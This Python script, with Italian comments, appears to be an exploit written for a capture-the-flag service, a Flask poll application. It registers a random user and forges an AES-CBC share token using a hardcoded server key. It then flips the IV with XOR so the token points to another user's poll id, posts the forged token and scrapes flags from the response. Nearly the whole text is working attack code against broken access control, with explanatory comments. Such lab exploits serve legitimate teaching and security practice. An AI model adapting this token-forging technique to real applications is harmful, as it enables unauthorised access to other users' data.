'''

Vulnerabilità: Broken Access Control
L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo a un sondaggio attraverso l'utilizzo di un
token modificato/manipolato.
La manipolazione viene effettuata tramite doppia operazione di XOR: ricordiamo che XOR è un'operazione bitwise che restituisce 
1 quando i bit sono diversi (1 ^ 0 = 1 e 0 ^ 1 = 1) e 0 quando sono uguali (1 ^ 1 = 0 e 0 ^ 0 = 0). È utilizzato per la manipolazione dei dati.


'''


import os
import requests
import random
import string
import re
from Crypto.Cipher import AES

# IP locale e port per il server Flask
ip = "127.0.0.1"
port = 5000

# Regex per cercare la flag: ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

server_key = b"16_r4ndom_bytes!"


def create_token(poll_id, server_key):
    # Creo un oggetto cifrario sfruttando la conoscenza della server_key e la modalità CBC
    cipher = AES.new(server_key, AES.MODE_CBC)
    # Dopo aver convertito l'id da stringa a bytes e aver effettuato il padding aggiungendo spazi 
    # finchè non si arriva a 16 byte, possiamo cifrare il messaggio
    token = cipher.encrypt(poll_id.encode().ljust(16))
    # L'IV deve essere concatenato al messaggio cifrato; si aggiunge l'IV perché sarà necessario per decifrare il messaggio
    token = cipher.iv + token

    return token



# Funzione XOR personalizzata per sequenze di bytes
def xor_bytes(a, b):
    # zip() è utilizzato per unire le due sequenze a e b di byte e applicare l'operazione di XOR su ciascun byte corrispondente.
    # La list comprehension (for i, j) itera su tutte le tuple generate da zip(a, b)
    # L'operatore ^ in Python esegue l'operazione bitwise XOR, che confronta i bit di x e y.
    return bytes([i ^ j for i, j in zip(a, b)])




'''
La logica della manipolazione del token sfrutta la proprietà dell'operazione XOR, che è reversibile. 
Ciò significa che se il server è progettato in modo da non verificare correttamente il token, è possibile manipolarlo 
in modo da ottenere un risultato desiderato, come l'accesso a un sondaggio che normalmente non sarebbe permesso.
'''
def manipulate_token(base_token, my_poll_id, poll_id):
    # Estraiamo i primi 16 byte dal base_token che corrispondono all'IV
    iv = base_token[:16]
    # Estraiamo il resto del base_token che contiene i dati cifrati (ovvero tutto tranne l'IV)
    cipher_data = base_token[16:] 

    # Prima operazione di XOR tra l'IV e il my_poll_id
    xor_result = xor_bytes(iv, my_poll_id.encode())

    # Seconda operazione di XOR tra il risultato precedente e il poll_id (noto): Il risultato finale 
    # è un altra sequenza di bytes manipolata che incorpora sia my_poll_id che poll_id
    final_xor_result = xor_bytes(xor_result, poll_id.encode())

    # Creazione del token manipolato con il risultato XOR seguito dai dati cifrati (senza IV)
    manipulated_token = final_xor_result + cipher_data

    return manipulated_token




def exploit():
    try:
        # Generazione casuale di un utente
        username_length = random.randint(5, 64)
        password_length = random.randint(5, 64)
        username = ''.join(random.choices(string.ascii_letters + string.digits, k = username_length))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k = password_length))

        print(f"Registrando l'utente con username: {username} e password: {password}")
        utente = {
            'utente': username,
            'password': password
        }

        # Creiamo una sessione per l'utente
        s = requests.Session()

        # Registrazione dell'utente
        register_response = s.post(f"http://{ip}:{port}/register", data = utente)
        print(f"Status code della registrazione: {register_response.status_code}")
        if register_response.status_code != 200:
            print(f"Errore durante la registrazione per {username}")


        # Login dell'utente
        login_response = s.post(f"http://{ip}:{port}/login", data = utente)
        print(f"Status code del login: {login_response.status_code}")
        if login_response.status_code != 200:
            print(f"Errore durante il login per {username}")
        

        # Creiamo un sondaggio fittizio, che ci servirà da "base" per la manipolazione del token
        my_poll_id = os.urandom(8).hex()
        poll_data = {
            "id": my_poll_id,
            "owner": utente, 
            "description": "Sondaggio test",
            "options": ["Opzione_1", "Opzione_2"],
            "votes": [0] * 2,
            "access": [[utente, 0]], 
            "expiration_date" : None
        }

        # Invio dei dati per creare il sondaggio
        creation_response = s.post(f"http://{ip}:{port}/create_poll", data = poll_data)
        print(f"Status code della creazione del sondaggio: {creation_response.status_code}")
        if creation_response.status_code != 200:
            print(f"Errore durante la creazione del sondaggio {poll_data['description']}")

        # Generiamo il token di condivisione
        base_token = create_token(my_poll_id, server_key)

        print(f"Base token: {base_token.hex()}")

        manipulated_token = manipulate_token(base_token, my_poll_id, "69d8239d955ba0a9")
        
        # Log del token manipolato
        print(f"Tento l'accesso con il token: {manipulated_token.hex()}")  # Invia il token manipolato come stringa esadecimale

        # Accesso al sondaggio tramite token manipolato (usa il formato esadecimale del token)
        access_response = s.post(f"http://{ip}:{port}/access_poll", data={"token": manipulated_token.hex()})
        
        if "Errore" in access_response.text:
            print("Errore: Token non valido per il sondaggio.")
        else:
            print("Token valido! Accesso riuscito.")

            # Se l'accesso al sondaggio è andato a buon fine, si cerca all'interno della pagina per trovare le flag
            flags = set(flag_regex.findall(access_response.text))  # Trova le flag nel risultato
            print(f"Trovate flag da {ip}: {flags}")

    except Exception as e:
        print(f"Errore durante l'exploit per {ip}: {str(e)}")




# Esecuzione dell'exploit
if __name__ == '__main__':
    exploit()
